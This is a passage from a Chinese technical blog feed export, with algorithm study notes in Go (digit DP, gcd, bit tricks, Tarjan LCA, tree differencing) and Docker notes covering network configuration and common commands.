<li>思想是考虑选择出来的元素要装到背包中，每个元素都有装或者不装两个选择</li>
<li>背包本身的价值可以使用map进行枚举，每个元素选择是否装入背包，装入则背包价值增加</li>
<li>每个价值的方案数因为一个元素的加入可以列出状态转移方程</li>
</ul>
<p>$$<br>count(价值) &#x3D; count(不包含这个元素时已有的方案数) + f(加上这个元素可以达到价值对应的方案数)<br>$$</p>
<ul>
<li>典型题目: <a href="https://leetcode.cn/problems/count-the-number-of-square-free-subsets/">无平方子集</a>，对应<a href="/bookPages/docs/leetcode/medium/leetcode2572/">讲解</a></li>
</ul>
<h3 id="6-2-数位dp"><a href="#6-2-数位dp" class="headerlink" title="6.2. 数位dp"></a>6.2. 数位dp</h3><ul>
<li>主要求某个上线以下满足某个条件的数的数量</li>
<li>一般上界很大，暴力会超时</li>
<li>主要思想是记忆化搜索，从最高位开始，向低位遍历每一位能取到的值，记忆一个状态下去</li>
</ul>
<h4 id="1-记忆化搜索模板"><a href="#1-记忆化搜索模板" class="headerlink" title="1) 记忆化搜索模板"></a>1) 记忆化搜索模板</h4><ul>
<li>在小于上界范围内，如果数可以从0到最大的n个9，同一个状态下，数量是一样的，记录下来不用重复统计</li>
<li>不可以取到最大n个9的单独计算</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数位dp模板</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NumDP</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> mod <span class="type">int</span> = <span class="number">1e9</span> + <span class="number">7</span></span><br><span class="line">	max_sum := <span class="number">10</span></span><br><span class="line"></span><br><span class="line">	stateNum := max_sum</span><br><span class="line">	<span class="comment">// 返回小于s的满足条件的数量</span></span><br><span class="line">	getCount := <span class="function"><span class="keyword">func</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="comment">// 状态记忆数组，第一维是位数，第二维是状态（状态根据具体情况来），value是从这一位向后满足状态的数量</span></span><br><span class="line">		memo := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="built_in">len</span>(s))</span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> memo &#123;</span><br><span class="line">			memo[i] = <span class="built_in">make</span>([]<span class="type">int</span>, stateNum+<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">for</span> j := <span class="keyword">range</span> memo[i] &#123;</span><br><span class="line">				memo[i][j] = <span class="number">-1</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// p为当前要枚举的位，0是最高位，len(s)-1是最低位</span></span><br><span class="line">		<span class="comment">// sum是前面位数的和</span></span><br><span class="line">		<span class="comment">// limitUp代表前面的数位是否都到达上界</span></span><br><span class="line">		<span class="keyword">var</span> dfs <span class="function"><span class="keyword">func</span><span class="params">(p, sum <span class="type">int</span>, limitUp <span class="type">bool</span>)</span></span> (res <span class="type">int</span>)</span><br><span class="line">		dfs = <span class="function"><span class="keyword">func</span><span class="params">(p, sum <span class="type">int</span>, limitUp <span class="type">bool</span>)</span></span> (res <span class="type">int</span>) &#123;</span><br><span class="line">			<span class="comment">// 处理一些限制条件</span></span><br><span class="line">			<span class="comment">// TODO</span></span><br><span class="line">			<span class="keyword">if</span> p == <span class="built_in">len</span>(s) &#123;</span><br><span class="line">				<span class="comment">// 到最后一位了，满足条件返回1，不满足返回0</span></span><br><span class="line">				<span class="comment">// TODO</span></span><br><span class="line">				<span class="keyword">if</span> <span class="literal">true</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> !limitUp &#123;</span><br><span class="line">				<span class="comment">// 没到上界才能取状态下的值，否则状态是假的</span></span><br><span class="line">				tmp := memo[p][sum]</span><br><span class="line">				<span class="keyword">if</span> tmp &gt;= <span class="number">0</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> tmp</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; memo[p][sum] = res &#125;()</span><br><span class="line">			&#125;</span><br><span class="line">			up := <span class="number">9</span></span><br><span class="line">			<span class="keyword">if</span> limitUp &#123;</span><br><span class="line">				up = <span class="type">int</span>(s[p] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> d := <span class="number">0</span>; d &lt;= up; d++ &#123;</span><br><span class="line">				res = (res + dfs(p+<span class="number">1</span>, sum+d, limitUp &amp;&amp; d == <span class="type">int</span>(s[p]-<span class="string">&#x27;0&#x27;</span>))) % mod</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	getCount(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-示例"><a href="#2-示例" class="headerlink" title="2) 示例"></a>2) 示例</h4><h5 id="1-求不大于给定数字s，所有位数相加小于n的数量，答案对1000000007取模"><a href="#1-求不大于给定数字s，所有位数相加小于n的数量，答案对1000000007取模" class="headerlink" title="(1) 求不大于给定数字s，所有位数相加小于n的数量，答案对1000000007取模"></a>(1) 求不大于给定数字s，所有位数相加小于n的数量，答案对1000000007取模</h5><ul>
<li>直接套用模板，限定条件带入，状态定义好</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数位dp模板</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">count</span><span class="params">(s <span class="type">string</span>, n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> mod <span class="type">int</span> = <span class="number">1e9</span> + <span class="number">7</span></span><br><span class="line"></span><br><span class="line">	stateNum := n</span><br><span class="line">	<span class="comment">// 状态记忆数组，第一维是位数，第二维是状态（状态为前面位加在一起的和），value是从这一位向后满足状态的数量</span></span><br><span class="line">	memo := <span class="built_in">make</span>([][]<span class="type">int</span>, <span class="built_in">len</span>(s))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> memo &#123;</span><br><span class="line">		memo[i] = <span class="built_in">make</span>([]<span class="type">int</span>, stateNum+<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">for</span> j := <span class="keyword">range</span> memo[i] &#123;</span><br><span class="line">			memo[i][j] = <span class="number">-1</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// p为当前要枚举的位，0是最高位，len(s)-1是最低位</span></span><br><span class="line">	<span class="comment">// sum是前面位数的和</span></span><br><span class="line">	<span class="comment">// limitUp代表前面的数位是否都到达上界</span></span><br><span class="line">	<span class="keyword">var</span> dfs <span class="function"><span class="keyword">func</span><span class="params">(p, sum <span class="type">int</span>, limitUp <span class="type">bool</span>)</span></span> (res <span class="type">int</span>)</span><br><span class="line">	dfs = <span class="function"><span class="keyword">func</span><span class="params">(p, sum <span class="type">int</span>, limitUp <span class="type">bool</span>)</span></span> (res <span class="type">int</span>) &#123;</span><br><span class="line">		<span class="comment">// 处理一些限制条件</span></span><br><span class="line">		<span class="comment">// 和不能大于n</span></span><br><span class="line">		<span class="keyword">if</span> sum &gt; n &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> p == <span class="built_in">len</span>(s) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> !limitUp &#123;</span><br><span class="line">			<span class="comment">// 没到上界才能取状态下的值，否则状态是假的</span></span><br><span class="line">			tmp := memo[p][sum]</span><br><span class="line">			<span class="keyword">if</span> tmp &gt;= <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> tmp</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; memo[p][sum] = res &#125;()</span><br><span class="line">		&#125;</span><br><span class="line">		up := <span class="number">9</span></span><br><span class="line">		<span class="keyword">if</span> limitUp &#123;</span><br><span class="line">			up = <span class="type">int</span>(s[p] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> d := <span class="number">0</span>; d &lt;= up; d++ &#123;</span><br><span class="line">			res = (res + dfs(p+<span class="number">1</span>, sum+d, limitUp &amp;&amp; d == <span class="type">int</span>(s[p]-<span class="string">&#x27;0&#x27;</span>))) % mod</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(count(<span class="string">&quot;12&quot;</span>, <span class="number">8</span>))	<span class="comment">// 12</span></span><br><span class="line">	fmt.Println(count(<span class="string">&quot;13&quot;</span>, <span class="number">8</span>))	<span class="comment">// 13</span></span><br><span class="line">	fmt.Println(count(<span class="string">&quot;19&quot;</span>, <span class="number">8</span>))	<span class="comment">// 17</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-gcd-最大公约数算法"><a href="#7-gcd-最大公约数算法" class="headerlink" title="7. gcd 最大公约数算法"></a>7. gcd 最大公约数算法</h2><ul>
<li>利用欧几里得算法，即辗转相除法</li>
</ul>
<h3 id="证明-1"><a href="#证明-1" class="headerlink" title="证明"></a>证明</h3><ul>
<li>a可以表示成 $a &#x3D; kb + r$（a，b，k，r皆为正整数，且 $r&lt;b$ ），则 $r &#x3D; a\ mod\ b$</li>
<li>假设d是a,b的一个公约数，记作 $d|a, d|b$，即a和b都可以被d整除。</li>
<li>而 $r &#x3D; a - kb$，两边同时除以d， $r&#x2F;d &#x3D; a&#x2F;d - kb&#x2F;d &#x3D; m$，由等式右边可知m为整数，因此 $d|r$</li>
<li>因此d也是 $b, a\ mod\ b$ 的公约数</li>
<li>假设d是 $b, a\ mod\ b$ 的公约数, 则 $d|b,d|(a - k \times b)$，k是一个整数</li>
<li>因此 $(a, b)$ 和 $(b,a\ mod\ b)$ 的公约数是一样的，其最大公约数也必然相等，得证</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gcd</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="comment">// 当a为最大公约数时，计算后a = 0，b = a</span></span><br><span class="line">	<span class="keyword">for</span> a != <span class="number">0</span> &#123;</span><br><span class="line">		a, b = b%a, a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-选取中位数"><a href="#8-选取中位数" class="headerlink" title="8. 选取中位数"></a>8. 选取中位数</h2><ul>
<li>可以使用两个堆，一个大根堆一个小根堆，中间的就是中位数</li>
</ul>
<h2 id="9-位运算的骚操作"><a href="#9-位运算的骚操作" class="headerlink" title="9. 位运算的骚操作"></a>9. 位运算的骚操作</h2><h3 id="9-1-取反"><a href="#9-1-取反" class="headerlink" title="9.1. 取反"></a>9.1. 取反</h3><h4 id="1-从低到高找第一个1"><a href="#1-从低到高找第一个1" class="headerlink" title="1) 从低到高找第一个1"></a>1) 从低到高找第一个1</h4><ul>
<li>取反加1，再和原来数字与一下</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFirst</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	v := (^i) + <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> i &amp; v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>举个例子，<code>0b00110010</code>，取反<code>0b11001101</code>，加一<code>0b11001110</code>，与一下原来的数<code>0b00000010</code></li>
</ul>
<h3 id="9-2-异或"><a href="#9-2-异或" class="headerlink" title="9.2. 异或"></a>9.2. 异或</h3><h4 id="1-0和1的互转"><a href="#1-0和1的互转" class="headerlink" title="1) 0和1的互转"></a>1) 0和1的互转</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := <span class="number">1</span></span><br><span class="line">	fmt.Println(a) <span class="comment">// 1</span></span><br><span class="line">	a ^= <span class="number">1</span></span><br><span class="line">	fmt.Println(a) <span class="comment">// 0</span></span><br><span class="line">	a ^= <span class="number">1</span></span><br><span class="line">	fmt.Println(a) <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-3-与运算"><a href="#9-3-与运算" class="headerlink" title="9.3. 与运算"></a>9.3. 与运算</h3><h4 id="1-2的幂次取整"><a href="#1-2的幂次取整" class="headerlink" title="1) 2的幂次取整"></a>1) 2的幂次取整</h4><h5 id="向下取整"><a href="#向下取整" class="headerlink" title="向下取整"></a>向下取整</h5><ul>
<li>直接二进制上与要取整的数减一取反就好了，如要对8也就是<code>0b1000</code>取整，就是与上<code>0b11111000</code></li>
</ul>
<h5 id="向上取整"><a href="#向上取整" class="headerlink" title="向上取整"></a>向上取整</h5><ul>
<li>由于需要有多余位就加一个，防止判断可以使用加上取整的数减一然后再对其取反相与</li>
<li>如要对8向上取整就是<code>(i + 0b00000111) &amp; 0b11111000</code></li>
</ul>
<h2 id="10-LCA-（Lowest-Common-Ancestor）最近公共祖先算法"><a href="#10-LCA-（Lowest-Common-Ancestor）最近公共祖先算法" class="headerlink" title="10. LCA （Lowest Common Ancestor）最近公共祖先算法"></a>10. LCA （Lowest Common Ancestor）最近公共祖先算法</h2><ul>
<li>主要处理无环图的两个点的公共祖先，一般用于求两个点之间的路径</li>
</ul>
<h3 id="10-1-Tarjan算法处理LCA"><a href="#10-1-Tarjan算法处理LCA" class="headerlink" title="10.1. Tarjan算法处理LCA"></a>10.1. Tarjan算法处理LCA</h3><ul>
<li>一次遍历把所有询问解决完</li>
<li>有个通俗的解释，十分清晰说明这个算法，参考 <a href="https://www.zhihu.com/question/68753603/answer/267513879">如何理解 Tarjan 的 LCA 算法？</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个熊孩子Link从一棵有根树的最左边最底下的结点灌岩浆，Link表示很讨厌这种倒着长的树。岩浆会不断的注入，直到注满整个树…如果岩浆灌满了一棵子树，Link发现树的另一边有一棵更深的子树，Link会先去将那棵子树灌满。岩浆只有在迫不得已的情况下才会向上升高，找到一个新的子树继续注入。机(yu)智(chun)的Link发现了找LCA的好方法，即如果两个结点都被岩浆烧掉时，他们的LCA即为那棵子树上岩浆最高的位置。</span><br></pre></td></tr></table></figure>

<ul>
<li>所以我们可以从根节点开始，向下走，当两个点都走到了，当前子树的根节点就是最近公共祖先，用并查集处理当前子树的根节点</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">				 0</span></span><br><span class="line"><span class="comment">			   /   \</span></span><br><span class="line"><span class="comment">			  2     3</span></span><br><span class="line"><span class="comment">			 /\    / \</span></span><br><span class="line"><span class="comment">			4  5  1   6</span></span><br><span class="line"><span class="comment">			  / \</span></span><br><span class="line"><span class="comment">			 7   8</span></span><br><span class="line"><span class="comment">			/</span></span><br><span class="line"><span class="comment">		   9</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// 关系图，代表某个点和哪个点连接</span></span><br><span class="line">	rel := [][]<span class="type">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">2</span>, <span class="number">3</span>&#125;,    <span class="comment">// 0</span></span><br><span class="line">		&#123;<span class="number">3</span>&#125;,       <span class="comment">// 1</span></span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>&#125;, <span class="comment">// 2</span></span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>&#125;, <span class="comment">// 3</span></span><br><span class="line">		&#123;<span class="number">2</span>&#125;,       <span class="comment">// 4</span></span><br><span class="line">		&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>&#125;, <span class="comment">// 5</span></span><br><span class="line">		&#123;<span class="number">3</span>&#125;,       <span class="comment">// 6</span></span><br><span class="line">		&#123;<span class="number">5</span>, <span class="number">9</span>&#125;,    <span class="comment">// 7</span></span><br><span class="line">		&#123;<span class="number">5</span>&#125;,       <span class="comment">// 8</span></span><br><span class="line">		&#123;<span class="number">7</span>&#125;,       <span class="comment">// 9</span></span><br><span class="line">	&#125;</span><br><span class="line">	n := <span class="number">10</span></span><br><span class="line"></span><br><span class="line">	trips := [][]<span class="type">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">4</span>, <span class="number">9</span>&#125;, <span class="comment">// 2</span></span><br><span class="line">		&#123;<span class="number">5</span>, <span class="number">6</span>&#125;, <span class="comment">// 0</span></span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">6</span>&#125;, <span class="comment">// 3</span></span><br><span class="line">		&#123;<span class="number">9</span>, <span class="number">0</span>&#125;, <span class="comment">// 0</span></span><br><span class="line">		&#123;<span class="number">7</span>, <span class="number">8</span>&#125;, <span class="comment">// 5</span></span><br><span class="line">	&#125;</span><br><span class="line">	qs := <span class="keyword">map</span>[<span class="type">int</span>][]<span class="type">int</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> trips &#123;</span><br><span class="line">		x, y := v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">		qs[x] = <span class="built_in">append</span>(qs[x], y)</span><br><span class="line">		<span class="keyword">if</span> x != y &#123;</span><br><span class="line">			<span class="comment">// 这里防止自己走到自己多算一遍</span></span><br><span class="line">			qs[y] = <span class="built_in">append</span>(qs[y], x)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 并查集模板</span></span><br><span class="line">	uf := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> uf &#123;</span><br><span class="line">		uf[i] = i</span><br><span class="line">	&#125;</span><br><span class="line">	find := <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		ap := uf[x]</span><br><span class="line">		<span class="comment">// 找到最终节点</span></span><br><span class="line">		<span class="keyword">for</span> ap != uf[ap] &#123;</span><br><span class="line">			ap = uf[ap]</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 沿途都赋值最终节点</span></span><br><span class="line">		<span class="keyword">for</span> x != ap &#123;</span><br><span class="line">			uf[x], x = ap, uf[x]</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ap</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把a的子集合并到b上，如果b是树根节点，a的所有子节点查找都会查找到b</span></span><br><span class="line">	merge := <span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		uf[find(a)] = find(b)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	color := <span class="built_in">make</span>([]<span class="type">bool</span>, n)</span><br><span class="line">	<span class="keyword">var</span> tarjan <span class="function"><span class="keyword">func</span><span class="params">(a, fa <span class="type">int</span>, cb <span class="keyword">func</span>(a, b, lca <span class="type">int</span>)</span></span>)</span><br><span class="line">	tarjan = <span class="function"><span class="keyword">func</span><span class="params">(a, fa <span class="type">int</span>, cb <span class="keyword">func</span>(a, b, lca <span class="type">int</span>)</span></span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> rel[a] &#123;</span><br><span class="line">			<span class="keyword">if</span> v == fa &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			tarjan(v, a, cb)</span><br><span class="line">			<span class="comment">// 进去出来后，将v为根节点的子树设置公共祖先为a</span></span><br><span class="line">			merge(v, a)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 查一下有没有要求的LCA</span></span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> qs[a] &#123;</span><br><span class="line">			<span class="keyword">if</span> v != a &amp;&amp; !color[v] &#123;</span><br><span class="line">				<span class="comment">// 自己走到自己是可以计算的，要判断</span></span><br><span class="line">				<span class="comment">// v还没走到，继续</span></span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			cb(a, v, find(v))</span><br><span class="line">		&#125;</span><br><span class="line">		color[a] = <span class="literal">true</span> <span class="comment">// a被灌了岩浆，也就是a的子树走完了，要向上走了</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 从0向下走</span></span><br><span class="line">	tarjan(<span class="number">0</span>, <span class="number">-1</span>, <span class="function"><span class="keyword">func</span><span class="params">(a, b, lca <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		fmt.Println(a, b, lca)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-差分"><a href="#11-差分" class="headerlink" title="11. 差分"></a>11. 差分</h2><h3 id="11-1-数组差分"><a href="#11-1-数组差分" class="headerlink" title="11.1. 数组差分"></a>11.1. 数组差分</h3><table>
<thead>
<tr>
<th>原数组</th>
<th>9</th>
<th>4</th>
<th>7</th>
<th>5</th>
<th>9</th>
</tr>
</thead>
<tbody><tr>
<td>前缀和</td>
<td>9</td>
<td>13</td>
<td>20</td>
<td>25</td>
<td>34</td>
</tr>
<tr>
<td>差分</td>
<td>9</td>
<td>-5</td>
<td>3</td>
<td>-2</td>
<td>4</td>
</tr>
<tr>
<td>前缀和的差分</td>
<td>9</td>
<td>4</td>
<td>7</td>
<td>5</td>
<td>9</td>
</tr>
<tr>
<td>差分的前缀和</td>
<td>9</td>
<td>4</td>
<td>7</td>
<td>5</td>
<td>9</td>
</tr>
</tbody></table>
<h3 id="11-2-树上差分"><a href="#11-2-树上差分" class="headerlink" title="11.2. 树上差分"></a>11.2. 树上差分</h3><ul>
<li>对下面的一棵树</li>
</ul>
<img src="2023-04-19-01.png" />

<ul>
<li>如果想要从一个点到另一个点中间经过的所有点都加一，通常做法是dfs遍历，经过的点都加一</li>
<li>单独一次请求时间复杂度为 $O(n)$ ，如果q次请求，时间复杂度就是 $O(nq)$</li>
<li>使用差分只需要设置两个点和他们的公共祖先和祖先的父级就可以标记，标记的时间复杂度为 $O(n + q)$ ，因为LCA使用Tarjan算法就可以实现一次遍历全部查询出来</li>
<li>LCA和Tarjan就不多叙述，见上文，这里说明一下差分如何推出原始数组</li>
<li>上图的树，假设从节点8到节点6，差分标记8和6都为1，节点3为拐点或称公共祖先，标记-1，3的父节点0标记-1</li>
</ul>
<img src="2023-04-19-02.png" />

<ul>
<li>那么一次dfs的处理就是，到根节点，将cnt加上当前值，返回给上一个节点，那么8和6到达3之前的都会设置为1，其他非路径的子树设置为0</li>
</ul>
<img src="2023-04-19-03.png" />

<ul>
<li>父节点的树等于两个子节点的和加上当前的差分，节点3就是<code>1 + 1 - 1 = 1</code>，节点0就是<code>1 + 0 - 1 = 0</code></li>
</ul>
<img src="2023-04-19-04.png" />

<ul>
<li>可以发现一次dfs处理后，所有节点都设置完了，而对应走过的路都被标记了1，很完美</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>docker学习笔记</title>
    <url>/blogs/2020-11-13-docker/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>docker是一个将软件虚拟化的工具，可以在任意设备上，建立虚拟机跑软件，实现快速环境搭建运行</p>
<h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h1><p>自行百度，不造轮子了</p>
<h1 id="三、配置"><a href="#三、配置" class="headerlink" title="三、配置"></a>三、配置</h1><h2 id="1-docker的默认网段"><a href="#1-docker的默认网段" class="headerlink" title="1. docker的默认网段"></a>1. docker的默认网段</h2><ul>
<li>修改<code>/etc/docker/daemon.json</code></li>
<li>默认的网段是<code>172.17.0.0/12</code>，size是16。代表分配的网桥段是<code>172.[17-31].0.0/16</code></li>
<li>下面配置代表新建立的网桥分配段为<code>172.31.[0-255].0/24</code></li>
<li>例如: 网桥1 <code>172.22.31.1.0/24</code>，网桥2 <code>172.22.31.2.0/24</code></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;default-address-pools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;base&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.31.0.0/16&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">24</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>已经建立好的网桥不会清除，需要停止容器，删除对应网桥重新起容器绑定新的才可以</li>
</ul>
<h2 id="2-docker的网络模式"><a href="#2-docker的网络模式" class="headerlink" title="2. docker的网络模式"></a>2. docker的网络模式</h2><ul>
<li>host: 不生成虚拟网卡和ip，使用宿主机的网络，无法使用端口映射</li>
<li>container: 和另一个容器共享ip和端口，compose配置<code>network_mode: &quot;container:[container name/id]&quot;</code></li>
<li>none: 关闭容器网络功能，容器无法联网</li>
<li>bridge: 创建一个网桥，虚拟出网卡和ip，通过docker0和iptables配置和主机通信</li>
<li>service: compose的概念，和service共享网络，配置<code>network_mode: &quot;service:[service name]&quot;</code></li>
</ul>
<h1 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### container##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止容器</span></span><br><span class="line">docker stop [container_id]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除container</span></span><br><span class="line">docker rm [container_id]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将某个容器变成自启动</span></span><br><span class="line">docker update [container_id] --restart=always</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拷贝文件</span></span><br><span class="line">docker cp [OPTIONS] [container_id]:[SRC_PATH] [DEST_PATH]</span><br><span class="line">docker cp [OPTIONS] [SRC_PATH] [container_id]:[DEST_PATH]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### image ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出所有image</span></span><br><span class="line">docker image list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入一个image</span></span><br><span class="line">docker load -i [image_file]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出一个image，使用image_id打包后导入名字会变成none</span></span><br><span class="line">docker save [image_id|image_name:tag] -o xxx.tar</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除image</span></span><br><span class="line">docker rmi [image_id]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重命名image</span></span><br><span class="line">docker tag [image_id] xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### logs ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看docker日志</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f : 跟踪日志输出</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--since : 显示某个开始时间的所有日志</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t : 显示时间戳</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--<span class="built_in">tail</span> :仅列出最新N条容器日志</span></span><br><span class="line">docker logs [OPTIONS] [container_name|container_id]</span><br></pre></td></tr></table></figure>

